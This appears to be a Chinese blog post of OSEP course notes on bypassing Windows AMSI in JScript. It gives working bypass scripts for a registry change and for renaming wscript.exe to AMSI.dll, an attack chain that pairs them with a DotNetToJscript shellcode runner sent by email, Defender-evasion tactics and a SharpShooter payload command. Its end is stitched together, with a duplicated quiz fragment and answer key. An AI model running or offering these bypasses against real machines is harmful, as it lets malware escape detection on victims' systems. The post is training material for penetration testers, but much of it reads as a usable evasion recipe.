---
title: OSEP-08-JScript-AMSI绕过
description: '08-AMSI绕过 | 08-JScript-AMSI绕过'
pubDate: 2026-01-30T00:01:21+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# JScript AMSI 绕过技术

## 写在前面

本章介绍在 JScript 环境中绕过 AMSI 的技术。JScript 的 AMSI 实现与 PowerShell 不同，需要采用不同的绕过策略。

---

## 一、JScript 中的 AMSI 特点

### 1.1 与 PowerShell 的区别

| 特性 | PowerShell | JScript |
|------|------------|---------|
| 执行程序 | powershell.exe | wscript.exe / cscript.exe |
| AMSI DLL | amsi.dll | amsi.dll |
| 会话管理 | 每个命令单独会话 | 单一会话处理所有代码 |
| AmsiOpenSession | 每次命令调用 | 不调用 |
| 反射能力 | 完整的 .NET 反射 | 无 |
| Win32 API 访问 | 通过 P/Invoke | 无直接访问 |

### 1.2 JScript AMSI 调用流程

```
JScript 执行流程：
┌─────────────────────────────────────────────────────────────┐
│  wscript.exe 启动                                           │
│       ↓                                                     │
│  加载 jscript.dll                                           │
│       ↓                                                     │
│  JAmsi::JAmsiIsEnabledByRegistry() 检查注册表               │
│       ↓                                                     │
│  如果启用，调用 AmsiScanString/AmsiScanBuffer               │
│       ↓                                                     │
│  执行或阻止脚本                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 二、注册表绕过方法

### 2.1 原理

JScript 在初始化时会检查注册表键：

```
HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable
```

如果该值为 0，AMSI 将被禁用。

### 2.2 使用 WinDbg 分析

```
# 设置断点
0:000> bu jscript!JAmsi::JAmsiIsEnabledByRegistry

# 继续执行
0:000> g

# 反汇编函数
0:000> u rip L20
jscript!JAmsi::JAmsiIsEnabledByRegistry:
...
00007fff`a3a868f1 488d15e8cb0800  lea     rdx,[jscript!`string']
00007fff`a3a868f8 48c7c101000080  mov     rcx,0FFFFFFFF80000001h
00007fff`a3a868ff ff15f3a60800    call    qword ptr [jscript!_imp_RegOpenKeyExW]
...
```

### 2.3 查看注册表路径

```
0:000> du 00007fff`a3b134e0
00007fff`a3b134e0  "SOFTWARE\Microsoft\Windows Script\Settings"

0:000> du 7fff`a3b134c0
00007fff`a3b134c0  "AmsiEnable"
```

### 2.4 JScript 绕过代码

```javascript
// 方法一：设置注册表禁用 AMSI
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";
sh.RegWrite(key, 0, "REG_DWORD");

// 注意：需要重新启动 wscript.exe 才能生效！
```

### 2.5 完整绕过脚本

```javascript
// AMSI 绕过 + 自动重启
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";

try {
    // 检查 AmsiEnable 是否已设置为 0
    var AmsiEnable = sh.RegRead(key);
    if (AmsiEnable != 0) {
        throw new Error(1, '');
    }
} catch(e) {
    // 设置注册表键
    sh.RegWrite(key, 0, "REG_DWORD");

    // 重新执行脚本
    // -e 指定脚本引擎 GUID
    // {F414C262-6AC0-11CF-B6D1-00AA00BBBB58} = JScript
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName, 0, 1);

    // 恢复注册表（可选）
    sh.RegWrite(key, 1, "REG_DWORD");

    // 退出当前实例
    WScript.Quit(1);
}

// ===== 以下是实际的恶意代码 =====
// 此时 AMSI 已被禁用

// 例如：DotNetToJscript shellcode runner
// ...
```

---

## 三、DLL 劫持绕过方法

### 3.1 原理

当 wscript.exe 加载 amsi.dll 时，如果进程名本身就是 "amsi.dll"，LoadLibraryExW 会认为 DLL 已加载，从而跳过加载。

### 3.2 分析 DLL 加载过程

使用 WinDbg 分析：

```
# 检测 DLL 加载
0:000> sxe ld amsi

# 继续执行
0:000> g

# 查看调用栈
0:000> k
...
09 00000085`733ed100 00007fff`a3a84ed8 jscript!COleScript::Initialize+0x2c
0a 00000085`733ed170 00007fff`a3a84c6c jscript!CJScriptClassFactory::CreateInstance+0x5c
...
```

### 3.3 分析 LoadLibraryExW 调用

```
0:000> u jscript!COleScript::Initialize LA
jscript!COleScript::Initialize:
...
00007fff`a3a84ec5 41b800080000    mov     r8d,800h  ; LOAD_LIBRARY_SEARCH_SYSTEM32
00007fff`a3a84ecb 488d0ddee40800  lea     rcx,[jscript!`string']
00007fff`a3a84ed2 ff15d0c10800    call    qword ptr [jscript!_imp_LoadLibraryExW]

0:000> du 7fff`a3b133b0
00007fff`a3b133b0  "amsi.dll"
```

**关键发现：**
- 加载 "amsi.dll" 时没有指定完整路径
- 使用了 LOAD_LIBRARY_SEARCH_SYSTEM32 标志

### 3.4 绕过方法

将 wscript.exe 复制并重命名为 amsi.dll，然后执行：

```javascript
// DLL 劫持绕过
var filesys = new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');

try {
    // 检查 amsi.dll 是否已存在
    if (filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll") == 0) {
        throw new Error(1, '');
    }
} catch(e) {
    // 复制 wscript.exe 并重命名为 amsi.dll
    filesys.CopyFile(
        "C:\\Windows\\System32\\wscript.exe",
        "C:\\Windows\\Tasks\\AMSI.dll"
    );

    // 使用重命名的可执行文件执行脚本
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName);

    WScript.Quit(1);
}

// ===== 以下是实际的恶意代码 =====
// 此时 AMSI 已被禁用
```

### 3.5 为什么这个方法有效？

```
正常流程：
┌─────────────────────────────────────────────────────────────┐
│  wscript.exe 启动                                           │
│       ↓                                                     │
│  LoadLibraryExW("amsi.dll", ...)                            │
│       ↓                                                     │
│  系统加载 C:\Windows\System32\amsi.dll                      │
│       ↓                                                     │
│  AMSI 初始化成功                                            │
└─────────────────────────────────────────────────────────────┘

绕过流程：
┌─────────────────────────────────────────────────────────────┐
│  amsi.dll (实际是 wscript.exe) 启动                         │
│       ↓                                                     │
│  LoadLibraryExW("amsi.dll", ...)                            │
│       ↓                                                     │
│  系统检测到进程名已经是 "amsi.dll"                          │
│       ↓                                                     │
│  认为 DLL 已加载，跳过加载                                  │
│       ↓                                                     │
│  AMSI 初始化失败，被禁用                                    │
└─────────────────────────────────────────────────────────────┘
```

---

## 四、与 DotNetToJscript 结合

### 4.1 完整攻击流程

```
攻击流程：
┌─────────────────────────────────────────────────────────────┐
│  1. 创建 C# shellcode runner                                │
│       ↓                                                     │
│  2. 使用 DotNetToJscript 转换为 JScript                     │
│       ↓                                                     │
│  3. 添加 AMSI 绕过代码                                      │
│       ↓                                                     │
│  4. 发送给目标（邮件附件、下载等）                          │
│       ↓                                                     │
│  5. 目标执行 JScript                                        │
│       ↓                                                     │
│  6. AMSI 被绕过                                             │
│       ↓                                                     │
│  7. Shellcode 执行                                          │
│       ↓                                                     │
│  8. 获得反向 shell                                          │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 完整示例代码

```javascript
// ============================================================
// JScript AMSI 绕过 + DotNetToJscript Shellcode Runner
// ============================================================

// AMSI 绕过部分
var sh = new ActiveXObject('WScript.Shell');
var key = "HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable";

try {
    var AmsiEnable = sh.RegRead(key);
    if (AmsiEnable != 0) {
        throw new Error(1, '');
    }
} catch(e) {
    sh.RegWrite(key, 0, "REG_DWORD");
    sh.Run("cscript -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName, 0, 1);
    sh.RegWrite(key, 1, "REG_DWORD");
    WScript.Quit(1);
}

// ===== DotNetToJscript 生成的代码 =====
// 以下是 DotNetToJscript 生成的 shellcode runner
// ...

function setversion() {
    // 设置 .NET 版本
    new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}

function debug(s) {}

function base64ToStream(b) {
    var enc = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = enc.GetByteCount_2(b);
    var ba = enc.GetBytes_4(b);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    ba = transform.TransformFinalBlock(ba, 0, length);
    var ms = new ActiveXObject("System.IO.MemoryStream");
    ms.Write(ba, 0, (length / 4) * 3);
    ms.Position = 0;
    return ms;
}

// ... 更多 DotNetToJscript 代码 ...
```

---

## 五、使用 Frida 验证绕过

### 5.1 监控 AMSI 调用

```bash
# 1. 执行带有 Sleep 的测试脚本
# 2. 快速获取 PID 并附加 Frida

frida-trace -p <wscript_PID> -x amsi.dll -i Amsi*
```

### 5.2 绕过前的输出

```
AmsiScanString()
   | [*] AmsiScanBuffer()
   | |- amsiContext: 0x26e81c079d0
   | |- buffer: IHost.Sleep("20000");
   | ...
   | [*] AmsiScanBuffer() Exit
   | |- Result value is: 32768    // 恶意！
```

### 5.3 绕过后的输出

```
Started tracing 9 functions. Press Ctrl+C to stop.
Process terminated

// 没有 AmsiScanBuffer 调用！
```

---

## 六、注意事项

### 6.1 检测风险

| 方法 | 检测风险 |
|------|----------|
| 注册表方法 | 注册表修改可能被监控 |
| DLL 劫持方法 | 创建 amsi.dll 进程可能触发警报 |

### 6.2 缓解措施

1. **注册表方法**：执行后立即恢复注册表值
2. **DLL 劫持方法**：使用进程注入或进程镂空技术快速迁移

### 6.3 Windows Defender 检测

DLL 劫持方法可能触发 Windows Defender 警报：

```
检测到威胁：
名称：amsi.dll
类型：可疑进程
```

**解决方案**：
- 立即进行进程迁移
- 使用进程注入技术
- 使用进程镂空技术

---

## 七、练习题

### 选择题

1. JScript 中 AMSI 检查的注册表路径是？
   - A) HKLM\Software\Microsoft\AMSI
   - B) HKCU\Software\Microsoft\Windows Script\Settings
   - C) HKCU\Software\Microsoft\PowerShell
   - D) HKLM\System\CurrentControlSet\Services

2. JScript 引擎的 GUID 是？
   - A) {F414C262-6AC0-11CF-B6D1-00AA00BBBB58}
   - B) {00000000-0000-0000-0000-000000000000}
   - C) {12345678-1234-1234-1234-123456789012}
   - D) {FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}

3. DLL 劫持绕过方法的原理是？
   - A) 替换系统 amsi.dll
   - B) 进程名为 amsi.dll 时跳过加载
   - C) 修改 amsi.dll 代码
   - D) 卸载 amsi.dll

4. 注册表绕过方法的限制是？
   - A) 需要管理员权限
   - B) 必须重启 wscript.exe 才生效
   - C) 只在 Windows 7 有效
   - D) 需要禁用 UAC

5. cscript.exe 和 wscript.exe 的主要区别是？
   - A) 前者是命令行版本
   - B) 前者不支持 JScript
   - C) 后者更安全
   - D) 没有区别

### 实操题

1. 使用注册表方法绕过 AMSI 并执行 DotNetToJscript shellcode runner
2. 使用 DLL 劫持方法绕过 AMSI
3. 使用 Frida 监控 JScript 的 AMSI 调用
4. 结合进程注入技术避免 Windows Defender 检测
5. 使用 WinDbg 分析 JAmsi::JAmsiIsEnabledByRegistry 函数

### 答案

选择题：1-B, 2-A, 3-B, 4-B, 5-A

---

## 八、DLL 劫持方法详解

### 8.1 DLL 搜索顺序

Windows 加载 DLL 时的搜索顺序：

```
默认搜索顺序：
1. 应用程序所在目录
2. System32 目录
3. System 目录
4. Windows 目录
5. 当前工作目录
6. PATH 环境变量中的目录
```

### 8.2 LoadLibraryExW 分析

```c
HMODULE LoadLibraryExW(
    LPCWSTR lpLibFileName,    // DLL 名称
    HANDLE  hFile,            // 保留，必须为 NULL
    DWORD   dwFlags           // 加载选项
);
```

**关键 Flag：**
```c
LOAD_LIBRARY_SEARCH_SYSTEM32 = 0x00000800
// 强制只在 System32 目录搜索
```

### 8.3 使用 WinDbg 深入分析

**步骤 1：设置断点**

```
0:000> bu jscript!COleScript::Initialize
0:000> g
```

**步骤 2：查看调用栈**

```
0:000> k
 # Child-SP          RetAddr           Call Site
00 00000085`733ec8f8 00007fff`d34ca369 ntdll!NtMapViewOfSection+0x14
...
09 00000085`733ed100 00007fff`a3a84ed8 KERNELBASE!LoadLibraryExW+0x161
0a 00000085`733ed170 00007fff`a3a84c6c jscript!COleScript::Initialize+0x2c
```

**步骤 3：反汇编加载代码**

```nasm
0:000> u jscript!COleScript::Initialize LA
jscript!COleScript::Initialize:
00007fff`a3a84ec5 41b800080000    mov     r8d,800h  ; LOAD_LIBRARY_SEARCH_SYSTEM32
00007fff`a3a84ecb 488d0ddee40800  lea     rcx,[jscript!`string']
00007fff`a3a84ed2 ff15d0c10800    call    qword ptr [jscript!_imp_LoadLibraryExW]

0:000> du 7fff`a3b133b0
00007fff`a3b133b0  "amsi.dll"
```

### 8.4 绕过原理图解

```
正常情况：
┌─────────────────────────────────────────────────────────────┐
│  wscript.exe 尝试加载 "amsi.dll"                            │
│       ↓                                                     │
│  LoadLibraryExW("amsi.dll", NULL, 0x800)                   │
│       ↓                                                     │
│  强制搜索 System32: C:\Windows\System32\amsi.dll           │
│       ↓                                                     │
│  加载成功，AMSI 初始化                                      │
└─────────────────────────────────────────────────────────────┘

绕过情况：
┌─────────────────────────────────────────────────────────────┐
│  amsi.dll 进程（实际是 wscript.exe 副本）                   │
│       ↓                                                     │
│  LoadLibraryExW("amsi.dll", NULL, 0x800)                   │
│       ↓                                                     │
│  检查：当前进程名 == "amsi.dll" ？                          │
│       ↓                                                     │
│  是！认为 DLL 已加载在内存中                                │
│       ↓                                                     │
│  返回现有模块句柄，不实际加载                               │
│       ↓                                                     │
│  AMSI API 调用失败，AMSI 被禁用                             │
└─────────────────────────────────────────────────────────────┘
```

### 8.5 完整 DLL 劫持代码

```javascript
// ============================================================
// JScript AMSI 绕过 - DLL 劫持方法
// ============================================================

var filesys = new ActiveXObject("Scripting.FileSystemObject");
var sh = new ActiveXObject('WScript.Shell');

try {
    // 检查 amsi.dll 是否已存在
    if (filesys.FileExists("C:\\Windows\\Tasks\\AMSI.dll") == 0) {
        throw new Error(1, '');
    }
} catch(e) {
    // 不存在，创建副本
    filesys.CopyFile(
        "C:\\Windows\\System32\\wscript.exe",
        "C:\\Windows\\Tasks\\AMSI.dll"
    );

    // 使用 Exec 而非 Run（避免 ShellExecute 限制）
    sh.Exec("C:\\Windows\\Tasks\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58} " + WScript.ScriptFullName);

    // 退出当前实例
    WScript.Quit(1);
}

// ===== 以下是实际的恶意代码 =====
// 此时 AMSI 已被禁用
// DotNetToJscript shellcode runner...
```

### 8.6 ShellExecute vs CreateProcess

**问题：** 为什么不能直接双击 amsi.dll？

```
ShellExecute 行为：
┌─────────────────────────────────────────────────────────────┐
│  用户双击 amsi.dll                                          │
│       ↓                                                     │
│  ShellExecute 检查文件扩展名 = .dll                         │
│       ↓                                                     │
│  查找注册表：.dll 默认操作 = LoadLibrary                    │
│       ↓                                                     │
│  尝试加载为 DLL（失败！）                                   │
└─────────────────────────────────────────────────────────────┘

CreateProcess 行为：
┌─────────────────────────────────────────────────────────────┐
│  sh.Exec("amsi.dll")                                        │
│       ↓                                                     │
│  CreateProcess 忽略扩展名                                   │
│       ↓                                                     │
│  读取文件头：MZ 签名（PE 文件）                             │
│       ↓                                                     │
│  作为可执行文件运行（成功！）                               │
└─────────────────────────────────────────────────────────────┘
```

**Exec vs Run 方法：**

```javascript
// Run 方法 - 使用 ShellExecute（失败）
sh.Run("C:\\Windows\\Tasks\\AMSI.dll ...", 0, 1);

// Exec 方法 - 使用 CreateProcess（成功）
sh.Exec("C:\\Windows\\Tasks\\AMSI.dll ...");
```

---

## 九、Windows Defender 检测与规避

### 9.1 检测行为

```
Defender 检测点：
1. 进程名异常
   └─ 进程名为 "amsi.dll" 很可疑

2. 文件位置异常
   └─ C:\Windows\Tasks\amsi.dll 不应该存在

3. 行为异常
   └─ wscript.exe 副本在非标准位置
```

### 9.2 检测日志

```
Threat detected
Name: Amsi.dll
Category: Suspicious Process
Severity: High
Status: Cleaned
```

### 9.3 规避策略

#### 策略 1：进程迁移

```javascript
// 1. 启动 shellcode runner
// 2. 立即注入到合法进程
// 3. 退出 amsi.dll 进程

// 使用进程注入技术
// - CreateRemoteThread
// - QueueUserAPC
// - Process Hollowing
```

#### 策略 2：进程镂空

```csharp
// C# shellcode runner with process hollowing
// 1. 启动挂起的合法进程
// 2. 卸载原始代码
// 3. 写入 shellcode
// 4. 恢复执行
```

#### 策略 3：更改文件名

```javascript
// 不使用 "amsi.dll"，使用其他名称
filesys.CopyFile(
    "C:\\Windows\\System32\\wscript.exe",
    "C:\\Windows\\Tasks\\update.exe"  // 改名
);

// 但这样不会绕过 AMSI，需要结合其他方法
```

---

## 十、综合比较

### 10.1 两种方法对比

| 特性 | 注册表方法 | DLL 劫持方法 |
|------|------------|--------------|
| 实现难度 | 简单 | 中等 |
| 隐蔽性 | 中等 | 低 |
| 检测风险 | 注册表监控 | 进程监控 |
| 持久性 | 非持久 | 非持久 |
| 权限要求 | 用户级 | 用户级 |
| 兼容性 | 高 | 高 |
| 稳定性 | 高 | 中等 |

### 10.2 选择建议

```
情况 1：需要最大隐蔽性
└─ 选择注册表方法 + 自动恢复注册表

情况 2：环境有注册表监控
└─ 选择 DLL 劫持 + 立即进程迁移

情况 3：测试环境
└─ 两种方法都可以

情况 4：生产环境
└─ 结合其他绕过技术（进程注入、内存执行）
```

---

## 十一、SharpShooter 集成

### 11.1 SharpShooter 简介

SharpShooter 是一个 payload 生成框架，支持：
- DotNetToJscript 转换
- AMSI 绕过集成
- 多种 delivery 方法

### 11.2 使用 SharpShooter 生成带 AMSI 绕过的 payload

```bash
# 基础用法
python SharpShooter.py \
    --payload js \
    --dotnetver 4 \
    --stageless \
    --rawscfile shellcode.bin \
    --amsi bypass \
    --output payload

# 生成的 payload.js 会自动包含 AMSI 绕过代码
```

---

## 十二、总结

### 12.1 关键技术点

✅ JScript 不调用 AmsiOpenSession
✅ 注册表方法：修改 AmsiEnable 键
✅ DLL 劫持：重命名 wscript.exe 为 amsi.dll
✅ 使用 Exec 而非 Run 方法
✅ 需要结合进程迁移避免检测

### 12.2 完整攻击链

```
1. 准备 C# shellcode runner
2. 使用 DotNetToJscript 转换
3. 添加 AMSI 绕过代码（注册表或 DLL 劫持）
4. 测试绕过效果（使用 Frida 验证）
5. 添加进程迁移或注入
6. 发送给目标
7. 执行并获得 shell
```

---

## 下一步

掌握了 JScript AMSI 绕过后，继续学习 [09-应用白名单绕过](/blog/osep/09-应用白名单绕过/00-章节指南/) 技术，这是另一个重要的防护机制。
   - B) 需要重启 wscript.exe
   - C) 只能用于 PowerShell
   - D) 需要修改系统文件

5. JScript 与 PowerShell AMSI 的主要区别是？
   - A) JScript 不支持 AMSI
   - B) JScript 不调用 AmsiOpenSession
   - C) JScript 使用不同的 DLL
   - D) JScript 不检查恶意代码

### 答案

1-B, 2-A, 3-B, 4-B, 5-B

---

## 下一步

掌握了 JScript AMSI 绕过技术后，继续学习 [09-UAC绕过与AMSI综合案例.md](/blog/osep/08-amsi绕过/09-uac绕过与amsi综合案例/)，了解如何在提权场景中绕过 AMSI。
